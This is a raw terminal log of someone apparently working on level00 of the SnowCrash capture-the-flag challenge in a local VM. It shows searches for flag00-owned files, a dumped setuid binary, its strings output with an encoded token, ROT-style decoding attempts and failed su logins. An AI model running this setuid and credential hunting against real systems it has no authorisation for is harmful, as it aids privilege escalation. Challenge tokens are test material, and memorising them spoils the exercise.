obi@robi-HP:~$ ssh level00@127.0.0.1 -p 2424
The authenticity of host '[127.0.0.1]:2424 ([127.0.0.1]:2424)' can't be established.
ED25519 key fingerprint is SHA256:cR0lJZ8guT8EC3piJ/HsoUwqDH3ZgzNFDfpZBAHE/QY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[127.0.0.1]:2424' (ED25519) to the list of known hosts.
level00@127.0.0.1's password: 
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-124-generic x86_64)

 System information as of Sat Sep 26 12:24:50 AM UTC 2026

  System load:             1.55
  Usage of /:              47.3% of 9.74GB
  Memory usage:            9%
  Swap usage:              0%
  Processes:               118
  Users logged in:         0
  IPv4 address for enp0s3: 10.0.2.15
  IPv6 address for enp0s3: fd17:625c:f037:2:a00:27ff:fe0f:c02a

 ____                         ____               _     
/ ___| _ __   _____      __  / ___|_ __ __ _ ___| |__  
\___ \| '_ \ / _ \ \ /\ / / | |   | '__/ _` / __| '_ \ 
 ___) | | | | (_) \ V  V /  | |___| | | (_| \__ \ | | |
|____/|_| |_|\___/ \_/\_/    \____|_|  \__,_|___/_| |_|
                                                       
  42 Network Security Challenge — v2   @wil

level00@snowcrash:~$ ls -la
total 28
drwxr-x---  3 level00 level00 4096 Sep 26  2026 .
drwxr-xr-x 37 root    root    4096 Jun  9 19:04 ..
-rw-r--r--  1 level00 level00  220 Mar 31  2024 .bash_logout
-rw-r--r--  1 level00 level00 3771 Mar 31  2024 .bashrc
drwx------  2 level00 level00 4096 Sep 26  2026 .cache
-rw-r--r--  1 level00 level00  807 Mar 31  2024 .profile
-r--r--r--  1 level00 level00   66 Jun  9 19:03 README
level00@snowcrash:~$ cat README
Hiro Protagonist. Last of the freelance hackers. Or so he thinks.
level00@snowcrash:~$ find /-user flag00 2>/dev/null
level00@snowcrash:~$ find / -user flag00 2>/dev/null
/home/flag00
/opt/snowcrash/level00/hiro
level00@snowcrash:~$ cat /home/flag00/.flag
cat: /home/flag00/.flag: Permission denied
level00@snowcrash:~$ ls -la /home/flag00
ls: cannot open directory '/home/flag00': Permission denied
level00@snowcrash:~$ ls -l /opt/snowcrash/level00/hiro
-r-sr-x--- 1 flag00 level00 27112 Jun  9 19:03 /opt/snowcrash/level00/hiro
level00@snowcrash:~$ ^C
level00@snowcrash:~$ cat /opt/snowcrash/level00/hiro
@ @@@�����000L�\�\p
                  �L�\�\�8880hhhDDS�td8880P�td\F\F\F��Q�tdR�td�L�\�\XX/lib64/ld-linux-x86-64.so.2 GNU���GNU��eNa%
            ��'��>G�BQ5�GGNU(��(*(��e�mfUa9���\ �
c�J�;�����x S?�4�qE�Dz/	� \�"�fgetssnprintfstdinstrncpy__stack_chk_failexitfflushdifftimefopengetpwuidgetgrnamusleepgetpidstdoutstrftimeatoistrcspn__libc_start_mainstderrctermidfprintf__cxa_finalizelocaltimegetgidfclosememsetfputcfputs__isoc99_sscanfgetuidgetegidfwritestrcmpstrncmpgeteuidlibc.so.6GLIBC_2.7GLIBC_2.4GLIBC_2.34GLIBC_2.2.5_ITM_deregisterTMCloneTable__gmon_start___ITM_registerTMCloneTable';���Eu�i	P��`�_�_�_�_&�_) `(0`*@`+�^�^�^�^�^��^	�^
_
_
_ _(_0_8_@_H_P_X_`_h_p_�x__�_�_�_�_ �_!�_"�_#�_$�_%�_'��H�H��OH��t��H���5�N�%�N@��h�����f���h�����f���h�����f���h����f���h����f���h����f���h����f���h�r���f����b���f���h	�R���f���h
�B���f���h
          �2���f���h
����f���h����f���h�����f���h�����f���h�����f���h�����f���h����f���h����f���h����f���h����f���h�r���f���h�b���f���h�R���f���h��B���f���h2���f���h�"���f���h����f���h����f���h�����f���h �����f���h!�����f���h"�����f����%�MfD���%FLfD���%>LfD���%6LfD���%.LfD���%&LfD���%LfD���%LfD���%LfD���%LfD���%�KfD���%�KfD���%�KfD���%�KfD���%�KfD���%�KfD���%�KfD���%�KfD���%�KfD���%�KfD���%�KfD���%�KfD���%�KfD���%�KfD���%�KfD���%�KfD���%~KfD���%vKfD���%nKfD���%fKfD���%^KfD���%VKfD���%NKfD���%FKfD���%>KfD���%6KfD��1�I��^H��H���PTE1�1�H�=��K�f.�H�=AKH�:KH9�tH��JH��t	�����H�=KH�5
KH)�H��H��?H��H�H��tH��JH����fD�����=�Ju+UH�=�JH��t
                                                   H�=�J������d�����J]������w�����UH��}���J�]���UH��H��H�}�H�E��@��t'H�E�H��`���AH�Ǹ�U����/J������UH��SH��hH������dH�%(H�E�1���I���%H������H�@H������H������H���5���H������H������H������H��H��� H������H������L�@\H�������HH������H���H������H�pH�������@A��H�������@A��H�������@
                   ��H������D�H������H������APQWVASAQA��E��H��H�L�H�Ǹ�"���H��0������������~/�������#������HcЋ�HH������H�Ή��s�����H�E�dH+%(t����H�]�����UH��H��H����H�����dH�%(H�E�1�H��������H����������H����������H�����H����������H�����@�� ���H�������$���H�����@(��(���H����H�H4H�����H���?H��H���X���H����H�HtH�����H��?H��H���0���H�����H�����H�J\�?H��H������H�����H���e����H�E�dH+%(t�Z�������UH��jG��x�`G�������OG�����]���UH��H��H�
                         $H�ĀH������dH�%(H�E�1�H������H���`H�2H�0��H�H���H�H�H�v�H�w�H�H���H)�H)�����������H��H���H��H�E�dH+%(t��������UH��H���H�����H�����dH�%(H�E�1�H�����H�G'H��H������H��(���H��(���u
������ǅ$����������<#��������<
��H��p���H��0���H������H�5�&H�Ǹ��������kH��0���H��&H��H���i�����uH��p���H������H�������%H��0���H��&H��H���/�����uH��p���H�������H������B��H��0���H�c&H��H���������uH��p���H������H�������H��0���H�8&H��H��������u��p���H���f���H������B�wH��0���H�
                                        &H��H��������u��p���H���.���H������B�?H��0���H��%H��H���I�����u"H�����H�H`H��p�����H��H��������$�������H��(���H�������H�������H��� ���H��(���H��������$���H�U�dH+%(t��������UH��}��E���]���UH��H�� �}�u�H�U��E��������E�U�H��H��H�H�H�H��H��EH�H�E�H�E��U�H�E��U�P�����H�U�H�H�E��@H�E�H�HH�E�?H��H�����������UH��SH��(�}�H�uЋE܉��8����E�U�H��H��H�H�H�H��H�>EH�H�E�H�E�@��t
                                                                                                    H�E�9E�t
������H�E�H�������H��H���
 )v������jH�}�t^H�E�H�U�H�
H�HH�H�JH�ZH�HH�XH�J H�Z(H�H H�X(H�J0H�Z8H�H0H�X8H�J@H�ZHH�H@H�XHH�RPH�PP�H�]�����UH��H��0�}܉u؉UԋE܉��)����E�U�H��H�H�H��H��BH�H�E������H�E�H�E��9E�u0H�E�H�H�E�H��H������fH~�f���*E�fHn�f/�r+H�E��U܉H�E�H�U�H�H�E��@H�E��@H�E��@�PH�E��PH�E��@9E�}H�E��@�PH�E��P�����������UH��H�}�H�E���{A9��������]���UH��SH��(H�}�H�u�H�E�H�X������H��H���3���fH~�H�E�H�EЋf���*��E�f/�v�������H�]�����UH��H��H�}�H�u�H�E��@t��u���!H��H���������u�����������UH��H��0�}�H�uЉU؃}�u
���H�E�H�������H�E�H�}�u
�������E܉������H�E�H�}�u
������H�E��PH�E��@9�u��qH�E�H�@H��t_�E��9H�E�H�H�E�H�@�M�Hc�H��H�H�H��H���;�����u��&�E�H�E�H�@�U�Hc�H��H�H�H��u����������UH��H�� �E�H��FH��H��FH��FH��v`��F�E�H��FH��x
                                                                 f���H*��H��H���H	�f���H*��X��E�E��kF�����H�bF�����UH��H�0FH��H�%F�]���UH��H�#FH��H�F�]���UH��H��0H������dH�%(H�E�1�H��������H������H�H����H������H�H H������H�pH������L�@H������H�H������H�H������H�VfHn�M��I��H��H�0�H�Ǹ�����H��������������~-��=��x#������HcЋ�=H������H�Ή��A�����H�E�dH+%(t�j�������UH��H�ĀH�}�H�u�dH�%(H�E�1�H�E����H�������:���H�U������H�U��B����H�U���'���H�U��B
                                         ������H�U�H�BH�E�H�PH�E�H�P H�E��H�E��P,�����B=�<=H�E��P������H�E�H�}�tH�E�H�HtH�E��?H��H������H�E��H�U�H�։�������u"H�E�H��4H�U�H�J�?H��H��������TH�E�����1���H�E�H�}�t<H�E�H�H�U�H�J4�?H��H������H�E�H�H�E��H�E���Ή�������H�E�dH+%(t���������UH��H��H�}�H�<H�E�H��H�������H�<H�ƿ
�)����L�����������UH��H��0H������H������dH�%(H�E�1�H�H������H��;H����HH���������������H�\;H���'�H��H��������I����ǅ�����H������H������H��H��������ySH�;H����H��H���G���H������H����H�����H�7BH��H�,B�`H��:H������H��H������H��:H���_���H��:H�������H�������H���H������H�HH��H������Ƅ����������H������H�B �v���H������H�H��H��������uH���������H������H�H��H���f�����uHH���S����]H������H����H���5�����uH�����"����,H������H����H��������tH������H����H���������uH�����������H������H����H��������uH���������H������H����H�H��H��������uH���������H������H����H���������t:H������H����H���������tH������H����H��������uH�����������H�Ǹ�9�����6����6H�������P��������69�}�����^����kH���������t]H��6H������H�
��6������t��6���3������H�E�dH+%(t��������UH��}��}�u���}��v�}���w���]���UH��H�}�H�}�t
                                                                                    H�E����u������tH��}�.t������H�E�H�U�H�E�H����u��]���UH��H��H�~�}�9~�}�_t�}�-t
                                            $H��PdH�%(H�E�1�H������H�������H������H��H�*�H���Z���H������H������H��H���j���H������H���t���H������H���E�����yH��H��������������������u-�����H������H��H��H�������H��H������H������H��4H���x�����y-����H������H��H��H������H��H���<����������������������Ή�������y-�T���H������H��H��H���L���H��H�������������������H������H�� H�Ή��h�����y-����H������H��H��H�������H��H������H������H������H��H������H������H��H��H������H������H������H������H������H��H������������H������H������H������H��H��������y������H�H��H���K����H������H�
                                                          H��H���0���H������H������H��H�������fH~�H������H������fHn��8���H�:H�������$����H�U�dH+%(t�c�������H�H��%Y-%m-%dT%H:%M:%S%s seq=%u uid=%d euid=%d gid=%d user=%s term=%s retries=%d event=%s
,<xflag00/var/log/snowcrash/hiro.logr%63[^=]=%127sversionmax_retriessession_timeoutrate_limitaudit_enabledlog_path/dev/pts//dev/ttyMETRICS sessions=%llu denials=%llu timeouts=%llu commands=%llu avg_secs=%.2f
flag00@snowcrash:~$ [*] Checking credentials...
[*] Access granted — welcome, flag00

Session timeout.

iduid=3000(flag00) gid=3000(flag00) groups=3000(flag00)whoamiflag00hostnameSnowCrashuname -aunameLinux SnowCrash 3.2.0-4-amd64 #1 SMP Debian 3.2.51-1 x86_64 GNU/Linuxpwd/home/flag00envSHELL=/bin/bashHOME=/home/flag00USER=flag00LOGNAME=flag00PATH=/usr/local/bin:/usr/bin:/binTERM=xterm-256colorlstotal 12drwxr-x--- 2 flag00 flag00 4096 Jan  1 00:00 .drwxr-xr-x 22 root   root   4096 Jan  1 00:00 ..-r-------- 1 flag00 flag00   32 Jan  1 00:00 .flag-rwsr-x--- 1 flag00 level00  12288 Jan  1 00:00 hirocatcat: permission deniedsudosudo: sorry, you must have a tty to run sudosusu: Authentication failureexitquitlogouthelpGNU bash, version 4.2.37(1)-release (x86_64-pc-linux-gnu)Type 'help' to see this list.%s: command not found
/etc/snowcrash/hiro.conferror: policy version mismatchdenied_uid_rangeerror: uid not permitteddenied_username_invaliderror: invalid usernamedenied_rate_limiterror: rate limit exceededdenied_grouperror: group membership check failedsession_startsession_end>@f2av5il02puano7naaf6adaf3a�����$���L���dD���
                                                                                                   -���|E��������������<���h��� ���@}���`�����'����5����%����O�������(J���H<���h�����
����'����,�����������$����D����dW����zRx
                                       0���&D$4����@FJ
O                                                     �?�9*3$"\����t����0�����E�C
|����EE�C
H�c���tE�C
5 ����>E�C
c���,E�C
�@����E�C
q����zE�C
J���E�C
����E�C
E����E�C
��i����E�C
a9���*E�C
E�Y��gE�C
� 8�����E�C
������E�C
������E�C
T]���E�C
TZ���E�C
�W���E�C
|<����E�C
������E�C
o8���8E�C
�P����E�C
������E�C
�@'
�-��������
�
 �^H`
     X
������o
���o���o�	���o�\0@P`p�������� 0@P`p�������� 0@`����GCC: (Ubuntu 13.3.0-6ubuntu2~24.04.1) 13.3.0��	� ��� 3@I`U�\|���\����@F`�`��`�`�`��`
$I�V$���)8�*����K����\�\F��^�<Pd � �`F�����`����-EWj�~����`��� �`*=Pjg��&o���*���������` *"E
                                                                                            K^Scrt1.o__abi_tagcrtstuff.cderegister_tm_clones__do_global_dtors_auxcompleted.0__do_global_dtors_aux_fini_array_entryframe_dummy__frame_dummy_init_array_entryhiro.cflag_datag_shutdown_flagg_audit_seqg_audit_fdg_retry_countg_session_pidg_policy_levelg_rate_tableg_cred_cachehandle_sigtermopen_auditwrite_audit_recordaudit_eventclose_auditload_default_policyparse_policy_fileuid_hashcache_credentialslookup_cached_credsrate_checkcheck_policy_versioncheck_session_timeoutcheck_terminalverify_group_membershipg_metricsmetrics_record_sessionmetrics_record_denialmetrics_record_commandmetrics_emitinit_contextfatalrun_restricted_shellvalidate_uid_rangevalidate_username_chars__FRAME_END___DYNAMIC__GNU_EH_FRAME_HDR_GLOBAL_OFFSET_TABLE_localtime@GLIBC_2.2.5__libc_start_main@GLIBC_2.34strncpy@GLIBC_2.2.5strncmp@GLIBC_2.2.5_ITM_deregisterTMCloneTablestdout@GLIBC_2.2.5stdin@GLIBC_2.2.5getpid@GLIBC_2.2.5_edatafclose@GLIBC_2.2.5getpwuid@GLIBC_2.2.5_fini__stack_chk_fail@GLIBC_2.4getuid@GLIBC_2.2.5difftime@GLIBC_2.2.5snprintf@GLIBC_2.2.5fputs@GLIBC_2.2.5memset@GLIBC_2.2.5geteuid@GLIBC_2.2.5fputc@GLIBC_2.2.5strcspn@GLIBC_2.2.5fgets@GLIBC_2.2.5__data_startstrcmp@GLIBC_2.2.5fprintf@GLIBC_2.2.5__gmon_start____dso_handlegetgrnam@GLIBC_2.2.5_IO_stdin_usedgetgid@GLIBC_2.2.5fflush@GLIBC_2.2.5__isoc99_sscanf@GLIBC_2.7_endgetegid@GLIBC_2.2.5__bss_startmainstrftime@GLIBC_2.2.5ctermid@GLIBC_2.2.5fopen@GLIBC_2.2.5atoi@GLIBC_2.2.5exit@GLIBC_2.2.5fwrite@GLIBC_2.2.5__TMC_END___ITM_registerTMCloneTable__cxa_finalize@GLIBC_2.2.5_initusleep@GLIBC_2.2.5stderr@GLIBC_2.2.5.symtab.strtab.shstrtab.interp.note.gnu.property.note.gnu.build-id.note.ABI-tag.gnu.hash.dynsym.dynstr.gnu.version.gnu.version_r.rela.dyn.rela.plt.init.plt.got.plt.sec.text.fini.rodata.flag_data.eh_frame_hdr.eh_frame.init_array.fini_array.dynamic.data.bss.comment#886hh$I�� W���o��a
        �q���o�	�	X~���o

�X
X
�B`
   `
�00@ �@F@F\F\F��PGPG����\�L��^� `P� 0P-HP
level00@snowcrash:~$ /opt/snowcrash/level00/hiro
[*] Checking credentials...
[*] Access granted — welcome, flag00
flag00@snowcrash:~$ getflag
getflag: command not found
flag00@snowcrash:~$ /bin/getflag
/bin/getflag: command not found
flag00@snowcrash:~$ /usr/bin/getflag
/usr/bin/getflag: command not found
flag00@snowcrash:~$ /usr/sbin/getflag
/usr/sbin/getflag: command not found
flag00@snowcrash:~$ cat /home/flag00/.flag
cat: permission denied
flag00@snowcrash:~$ ls -la
total 12
drwxr-x--- 2 flag00 flag00 4096 Jan  1 00:00 .
drwxr-xr-x 22 root   root   4096 Jan  1 00:00 ..
-r-------- 1 flag00 flag00   32 Jan  1 00:00 .flag
-rwsr-x--- 1 flag00 level00  12288 Jan  1 00:00 hiro
flag00@snowcrash:~$ cat .flag
cat: permission denied
flag00@snowcrash:~$ cat /.flag  
cat: permission denied
flag00@snowcrash:~$ chmod 777 .flag
chmod 777 .flag: command not found
flag00@snowcrash:~$ find / -name getflag 2>/dev/null
find / -name getflag 2>/dev/null: command not found

Session timeout.
level00@snowcrash:~$ /opt/snowcrash/level00/hiro
[*] Checking credentials...
[*] Access granted — welcome, flag00
flag00@snowcrash:~$ find / -name getflag 2>/dev/null
find / -name getflag 2>/dev/null: command not found
flag00@snowcrash:~$ strings /opt/snowcrash/level00/hiro
strings /opt/snowcrash/level00/hiro: command not found
flag00@snowcrash:~$ ^C  
level00@snowcrash:~$ strings /opt/snowcrash/level00/hiro
/lib64/ld-linux-x86-64.so.2
eNa%
mfUa
fgets
snprintf
stdin
strncpy
__stack_chk_fail
exit
fflush
difftime
fopen
getpwuid
getgrnam
usleep
getpid
stdout
strftime
atoi
strcspn
__libc_start_main
stderr
ctermid
fprintf
__cxa_finalize
localtime
getgid
fclose
memset
fputc
fputs
__isoc99_sscanf
getuid
getegid
fwrite
strcmp
strncmp
geteuid
libc.so.6
GLIBC_2.7
GLIBC_2.4
GLIBC_2.34
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
PTE1
u+UH
APQWVASAQA
%Y-%m-%dT%H:%M:%S
%s seq=%u uid=%d euid=%d gid=%d user=%s term=%s retries=%d event=%s
flag00
/var/log/snowcrash/hiro.log
%63[^=]=%127s
version
max_retries
session_timeout
rate_limit
audit_enabled
log_path
/dev/pts/
/dev/tty
METRICS sessions=%llu denials=%llu timeouts=%llu commands=%llu avg_secs=%.2f
flag00@snowcrash:~$ 
[*] Checking credentials...
[*] Access granted 
 welcome, flag00
Session timeout.
uid=3000(flag00) gid=3000(flag00) groups=3000(flag00)
whoami
flag00
hostname
SnowCrash
uname -a
uname
Linux SnowCrash 3.2.0-4-amd64 #1 SMP Debian 3.2.51-1 x86_64 GNU/Linux
/home/flag00
SHELL=/bin/bash
HOME=/home/flag00
USER=flag00
LOGNAME=flag00
PATH=/usr/local/bin:/usr/bin:/bin
TERM=xterm-256color
total 12
drwxr-x--- 2 flag00 flag00 4096 Jan  1 00:00 .
drwxr-xr-x 22 root   root   4096 Jan  1 00:00 ..
-r-------- 1 flag00 flag00   32 Jan  1 00:00 .flag
-rwsr-x--- 1 flag00 level00  12288 Jan  1 00:00 hiro
cat: permission denied
sudo
sudo: sorry, you must have a tty to run sudo
su: Authentication failure
exit
quit
logout
help
GNU bash, version 4.2.37(1)-release (x86_64-pc-linux-gnu)
Type 'help' to see this list.
%s: command not found
/etc/snowcrash/hiro.conf
error: policy version mismatch
denied_uid_range
error: uid not permitted
denied_username_invalid
error: invalid username
denied_rate_limit
error: rate limit exceeded
denied_group
error: group membership check failed
session_start
session_end
>@f2av5il02puano7naaf6adaf3a
9*3$"
GCC: (Ubuntu 13.3.0-6ubuntu2~24.04.1) 13.3.0
Scrt1.o
__abi_tag
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.0
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
hiro.c
flag_data
g_shutdown_flag
g_audit_seq
g_audit_fd
g_retry_count
g_session_pid
g_policy_level
g_rate_table
g_cred_cache
handle_sigterm
open_audit
write_audit_record
audit_event
close_audit
load_default_policy
parse_policy_file
uid_hash
cache_credentials
lookup_cached_creds
rate_check
check_policy_version
check_session_timeout
check_terminal
verify_group_membership
g_metrics
metrics_record_session
metrics_record_denial
metrics_record_command
metrics_emit
init_context
fatal
run_restricted_shell
validate_uid_range
validate_username_chars
__FRAME_END__
_DYNAMIC
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
localtime@GLIBC_2.2.5
__libc_start_main@GLIBC_2.34
strncpy@GLIBC_2.2.5
strncmp@GLIBC_2.2.5
_ITM_deregisterTMCloneTable
stdout@GLIBC_2.2.5
stdin@GLIBC_2.2.5
getpid@GLIBC_2.2.5
_edata
fclose@GLIBC_2.2.5
getpwuid@GLIBC_2.2.5
_fini
__stack_chk_fail@GLIBC_2.4
getuid@GLIBC_2.2.5
difftime@GLIBC_2.2.5
snprintf@GLIBC_2.2.5
fputs@GLIBC_2.2.5
memset@GLIBC_2.2.5
geteuid@GLIBC_2.2.5
fputc@GLIBC_2.2.5
strcspn@GLIBC_2.2.5
fgets@GLIBC_2.2.5
__data_start
strcmp@GLIBC_2.2.5
fprintf@GLIBC_2.2.5
__gmon_start__
__dso_handle
getgrnam@GLIBC_2.2.5
_IO_stdin_used
getgid@GLIBC_2.2.5
fflush@GLIBC_2.2.5
__isoc99_sscanf@GLIBC_2.7
_end
getegid@GLIBC_2.2.5
__bss_start
main
strftime@GLIBC_2.2.5
ctermid@GLIBC_2.2.5
fopen@GLIBC_2.2.5
atoi@GLIBC_2.2.5
exit@GLIBC_2.2.5
fwrite@GLIBC_2.2.5
__TMC_END__
_ITM_registerTMCloneTable
__cxa_finalize@GLIBC_2.2.5
_init
usleep@GLIBC_2.2.5
stderr@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.gnu.property
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.plt.sec
.text
.fini
.rodata
.flag_data
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.data
.bss
.comment
level00@snowcrash:~$ echo "f2av5il02puano7naaf6adaf3a" | tr 'a-zA-Z' 'l-za-kL-ZA-K'
q2lg5tw02aflyz7yllq6lolq3l
level00@snowcrash:~$ ssh level01@localhost -p 2424
ssh: connect to host localhost port 2424: Connection refused
level00@snowcrash:~$ exit
logout
Connection to 127.0.0.1 closed.
robi@robi-HP:~$ ssh level01@127.0.0.1 -p 2424
level01@127.0.0.1's password: 
Permission denied, please try again.
level01@127.0.0.1's password: 
Permission denied, please try again.
level01@127.0.0.1's password: 
Connection closed by 127.0.0.1 port 2424
robi@robi-HP:~$ ssh level01@127.0.0.1 -p 2424
level01@127.0.0.1's password: 
Permission denied, please try again.
level01@127.0.0.1's password: 
Permission denied, please try again.
level01@127.0.0.1's password: 
Connection closed by 127.0.0.1 port 2424
robi@robi-HP:~$ su flag00
su: el usuario flag00 no existe o la entrada del usuario no contiene todos los campos requeridos
robi@robi-HP:~$ ssh level00@localhost -p 2424
The authenticity of host '[localhost]:2424 ([127.0.0.1]:2424)' can't be established.
ED25519 key fingerprint is SHA256:cR0lJZ8guT8EC3piJ/HsoUwqDH3ZgzNFDfpZBAHE/QY.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:1: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[localhost]:2424' (ED25519) to the list of known hosts.
level00@localhost's password: 
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-124-generic x86_64)

 System information as of Sat Sep 26 12:24:50 AM UTC 2026

  System load:             1.55
  Usage of /:              47.3% of 9.74GB
  Memory usage:            9%
  Swap usage:              0%
  Processes:               118
  Users logged in:         0
  IPv4 address for enp0s3: 10.0.2.15
  IPv6 address for enp0s3: fd17:625c:f037:2:a00:27ff:fe0f:c02a

 ____                         ____               _     
/ ___| _ __   _____      __  / ___|_ __ __ _ ___| |__  
\___ \| '_ \ / _ \ \ /\ / / | |   | '__/ _` / __| '_ \ 
 ___) | | | | (_) \ V  V /  | |___| | | (_| \__ \ | | |
|____/|_| |_|\___/ \_/\_/    \____|_|  \__,_|___/_| |_|
                                                       
  42 Network Security Challenge — v2   @wil

Last login: Fri Sep 25 22:25:49 2026 from 10.0.2.2
level00@snowcrash:~$ su flag00
Password: 
su: Authentication failure
level00@snowcrash:~$ su flag00
Password: 
su: Authentication failure
level00@snowcrash:~$ python3 -c 'import string; s="f2av5il02puano7naaf6adaf3a"; trans=str.maketrans(string.ascii_lowercase, string.ascii_lowercase[15:] + string.ascii_lowercase[:15]); print(s.translate(trans))'
u2pk5xa02ejpcd7cppu6pspu3p
level00@snowcrash:~$ su flag00
Password: 
su: Authentication failure
level00@snowcrash:~$ su flag00
Password: 
su: Authentication failure
level00@snowcrash:~$ su flag00
Password: 
su: Authentication failure
level00@snowcrash:~$ find / -user flag00 2>/dev/null
/home/flag00
/opt/snowcrash/level00/hiro
level00@snowcrash:~$ find / -group level00 2>/dev/null
/run/user/1001
/run/user/1001/snapd-session-agent.socket
/run/user/1001/pk-debconf-socket
/run/user/1001/gnupg
/run/user/1001/gnupg/S.gpg-agent.ssh
/run/user/1001/gnupg/S.keyboxd
/run/user/1001/gnupg/S.gpg-agent
/run/user/1001/gnupg/S.gpg-agent.extra
/run/user/1001/gnupg/S.gpg-agent.browser
/run/user/1001/gnupg/S.dirmngr
/run/user/1001/bus
/run/user/1001/systemd
/run/user/1001/systemd/private
/run/user/1001/systemd/notify
/run/user/1001/systemd/generator.late
/run/user/1001/systemd/generator.late/app-snap\x2duserd\x2dautostart@autostart.service
/run/user/1001/systemd/generator.late/xdg-desktop-autostart.target.wants
/run/user/1001/systemd/generator.late/xdg-desktop-autostart.target.wants/app-snap\x2duserd\x2dautostart@autostart.service
/run/user/1001/systemd/generator.late/xdg-desktop-autostart.target.wants/app-xdg\x2duser\x2ddirs@autostart.service
/run/user/1001/systemd/generator.late/app-xdg\x2duser\x2ddirs@autostart.service
/run/user/1001/systemd/units
/run/user/1001/systemd/units/invocation:gpg-agent-ssh.socket
/run/user/1001/systemd/units/invocation:dbus.socket
/run/user/1001/systemd/propagate
/run/user/1001/systemd/propagate/.os-release-stage
/run/user/1001/systemd/propagate/.os-release-stage/os-release
/run/user/1001/systemd/inaccessible
/run/user/1001/systemd/inaccessible/chr
/run/user/1001/systemd/inaccessible/sock
/run/user/1001/systemd/inaccessible/fifo
/run/user/1001/systemd/inaccessible/dir
/run/user/1001/systemd/inaccessible/reg
/proc/944
/proc/944/task
/proc/944/task/944
/proc/944/task/944/fdinfo
/proc/944/task/944/net
/proc/944/task/944/attr
/proc/944/task/944/attr/smack
/proc/944/task/944/attr/apparmor
/proc/944/fdinfo
/proc/944/net
/proc/944/attr
/proc/944/attr/smack
/proc/944/attr/apparmor
/proc/1025
/proc/1025/task
/proc/1025/task/1025
/proc/1025/task/1025/fd
/proc/1025/task/1025/fd/0
/proc/1025/task/1025/fd/1
/proc/1025/task/1025/fd/2
/proc/1025/task/1025/fd/3
/proc/1025/task/1025/fd/4
/proc/1025/task/1025/fd/5
/proc/1025/task/1025/fd/6
/proc/1025/task/1025/fd/7
/proc/1025/task/1025/fd/9
/proc/1025/task/1025/fd/10
/proc/1025/task/1025/fd/11
/proc/1025/task/1025/fd/12
/proc/1025/task/1025/fd/13
/proc/1025/task/1025/fd/14
/proc/1025/task/1025/fd/15
/proc/1025/task/1025/fd/16
/proc/1025/task/1025/fd/17
/proc/1025/task/1025/fd/18
/proc/1025/task/1025/fd/19
/proc/1025/task/1025/fd/20
/proc/1025/task/1025/fd/21
/proc/1025/task/1025/fd/22
/proc/1025/task/1025/fd/23
/proc/1025/task/1025/fd/28
/proc/1025/task/1025/fd/29
/proc/1025/task/1025/fd/30
/proc/1025/task/1025/fd/31
/proc/1025/task/1025/fd/32
/proc/1025/task/1025/fd/35
/proc/1025/task/1025/fd/36
/proc/1025/task/1025/fd/37
/proc/1025/task/1025/fd/38
/proc/1025/task/1025/fdinfo
/proc/1025/task/1025/ns
/proc/1025/task/1025/ns/net
/proc/1025/task/1025/ns/uts
/proc/1025/task/1025/ns/ipc
/proc/1025/task/1025/ns/pid
/proc/1025/task/1025/ns/pid_for_children
/proc/1025/task/1025/ns/user
/proc/1025/task/1025/ns/mnt
/proc/1025/task/1025/ns/cgroup
/proc/1025/task/1025/ns/time
/proc/1025/task/1025/ns/time_for_children
/proc/1025/task/1025/net
/proc/1025/task/1025/environ
/proc/1025/task/1025/auxv
/proc/1025/task/1025/status
/proc/1025/task/1025/personality
/proc/1025/task/1025/limits
/proc/1025/task/1025/sched
/proc/1025/task/1025/comm
/proc/1025/task/1025/syscall
/proc/1025/task/1025/cmdline
/proc/1025/task/1025/stat
/proc/1025/task/1025/statm
/proc/1025/task/1025/maps
/proc/1025/task/1025/children
/proc/1025/task/1025/numa_maps
/proc/1025/task/1025/mem
/proc/1025/task/1025/cwd
/proc/1025/task/1025/root
/proc/1025/task/1025/exe
/proc/1025/task/1025/mounts
/proc/1025/task/1025/mountinfo
/proc/1025/task/1025/clear_refs
/proc/1025/task/1025/smaps
/proc/1025/task/1025/smaps_rollup
/proc/1025/task/1025/pagemap
/proc/1025/task/1025/attr
/proc/1025/task/1025/attr/current
/proc/1025/task/1025/attr/prev
/proc/1025/task/1025/attr/exec
/proc/1025/task/1025/attr/fscreate
/proc/1025/task/1025/attr/keycreate
/proc/1025/task/1025/attr/sockcreate
/proc/1025/task/1025/attr/smack
/proc/1025/task/1025/attr/smack/current
/proc/1025/task/1025/attr/apparmor
/proc/1025/task/1025/attr/apparmor/current
/proc/1025/task/1025/attr/apparmor/prev
/proc/1025/task/1025/attr/apparmor/exec
/proc/1025/task/1025/wchan
/proc/1025/task/1025/stack
/proc/1025/task/1025/schedstat
/proc/1025/task/1025/latency
/proc/1025/task/1025/cpuset
/proc/1025/task/1025/cgroup
/proc/1025/task/1025/cpu_resctrl_groups
/proc/1025/task/1025/oom_score
/proc/1025/task/1025/oom_adj
/proc/1025/task/1025/oom_score_adj
/proc/1025/task/1025/loginuid
/proc/1025/task/1025/sessionid
/proc/1025/task/1025/io
/proc/1025/task/1025/uid_map
/proc/1025/task/1025/gid_map
/proc/1025/task/1025/projid_map
/proc/1025/task/1025/setgroups
/proc/1025/task/1025/patch_state
/proc/1025/task/1025/arch_status
/proc/1025/task/1025/ksm_merging_pages
/proc/1025/task/1025/ksm_stat
/proc/1025/fd
/proc/1025/fd/0
/proc/1025/fd/1
/proc/1025/fd/2
/proc/1025/fd/3
/proc/1025/fd/4
/proc/1025/fd/5
/proc/1025/fd/6
/proc/1025/fd/7
/proc/1025/fd/9
/proc/1025/fd/10
/proc/1025/fd/11
/proc/1025/fd/12
/proc/1025/fd/13
/proc/1025/fd/14
/proc/1025/fd/15
/proc/1025/fd/16
/proc/1025/fd/17
/proc/1025/fd/18
/proc/1025/fd/19
/proc/1025/fd/20
